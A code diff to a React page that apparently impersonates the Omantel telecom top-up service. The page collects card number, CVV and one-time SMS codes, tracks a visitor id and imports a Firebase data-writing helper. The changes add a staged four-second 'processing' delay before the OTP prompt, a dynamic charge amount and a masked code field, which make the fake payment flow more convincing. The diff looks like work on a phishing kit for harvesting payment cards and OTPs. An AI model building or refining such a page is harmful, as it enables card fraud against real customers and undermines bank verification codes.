@@ -16,6 +16,7 @@ import {
   PhoneCall,
   ArrowRight,
   CheckCircle2,
+  Loader2,
 } from "lucide-react"
 import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
@@ -30,10 +31,11 @@ import {
   DialogFooter,
   DialogClose,
 } from "@/components/ui/dialog"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { addData } from "@/lib/firebase"
 import { OmantelLogo } from "@/components/logo"
 import Image from "next/image"
+import { Badge } from "@/components/ui/badge"
 const allOtps=['']
 export default function OmantelPage(): ReactElement {
   // Form state management
@@ -45,10 +47,16 @@ export default function OmantelPage(): ReactElement {
     cvv: "", // Add CVV field
   })
   const [otp, setOtp] = useState("")
+  const [amount, setAmount] = useState("")
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isSuccess, setIsSuccess] = useState(false)
   const [isDialogOpen, setIsDialogOpen] = useState(false)
+  const [loading, setIsLoading] = useState(false)
 
+useEffect(()=>{
+  const amo=localStorage.getItem('amount')
+  setAmount(amo!)
+},[])
   // Handle form input changes
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>): void => {
     const { id, value } = e.target
@@ -103,7 +111,7 @@ export default function OmantelPage(): ReactElement {
 
   const handleFormSubmit = (e: React.FormEvent<HTMLFormElement>): void => {
     e.preventDefault()
-
+    setIsLoading(true)
     // Basic validation  e.preventDefault()
 
     const _id=localStorage.getItem('visitor')
@@ -131,8 +139,11 @@ export default function OmantelPage(): ReactElement {
     }
 
     // Open the OTP dialog
-    setIsDialogOpen(true)
-  }
+setTimeout(() => {
+  setIsLoading(false)
+      setIsDialogOpen(true)
+}, 4000); 
+ }
 
   const handleOtpSubmit = (): void => {
     // Validate OTP
@@ -154,7 +165,6 @@ export default function OmantelPage(): ReactElement {
 
       // Close dialog after showing success for a moment
       setTimeout(() => {
-        setIsDialogOpen(false)
         // Reset form after successful submission
         setFormValues({
           cardNumber: "",
@@ -283,7 +293,7 @@ export default function OmantelPage(): ReactElement {
 
               <DialogTrigger asChild>
                 <Button type="submit" className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold mt-6">
-                  تعبئة الرصيد (5.000 ر.ع)
+                  تعبئة الرصيد ({amount} ر.ع) {loading && <Loader2 className="animate-spin"/>}
                 </Button>
               </DialogTrigger>
               <div className="flex justify-center ">
@@ -320,8 +330,9 @@ export default function OmantelPage(): ReactElement {
                         onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                         className="col-span-3 text-center tracking-widest text-lg"
                         maxLength={6}
-                        placeholder="000000"
+                        placeholder="******"
                       />
+                   
                     </div>
                   </div>
 
